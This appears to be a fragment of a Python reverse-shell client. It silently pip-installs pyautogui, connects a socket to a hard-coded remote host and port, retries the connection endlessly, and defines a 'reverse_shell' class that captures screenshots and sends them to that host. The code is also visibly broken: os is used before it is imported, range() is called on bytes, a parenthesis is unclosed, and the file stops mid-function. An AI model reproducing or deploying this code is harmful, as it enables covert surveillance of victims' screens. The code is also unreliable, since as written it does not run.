'''cheking the moduels'''
try:
    import pyautogui
    import tqdm
    import subprocess
except:
    os.system("pip install pyautogui > install.txt")
    os.system("pip3 install tqdm > install.txt")
    os.system("rm install.txt")
    import pyautogui
    import tqdm
    import subprocess

import os , sys , time, socket
'''setting variables'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.110"
port = 5050
SEPARATOR = "<SEPARATOR>"
'''creaing connetcion'''
def connection():
    try:
        s.connect((host ,port))
    except:
        return connection()
'''creating class'''
class reverse_shell:
    def screenshot():
        for i in range(data[2:].encode("utf-8")):
            screenshot = pyautogui.screenshot()
            img = screenshot.save(f"target{i}.png")
            img_size = os.path.getsize(img)
            s.send(f"{img}{SEPARATOR}{img_size}".encode("utf-8")
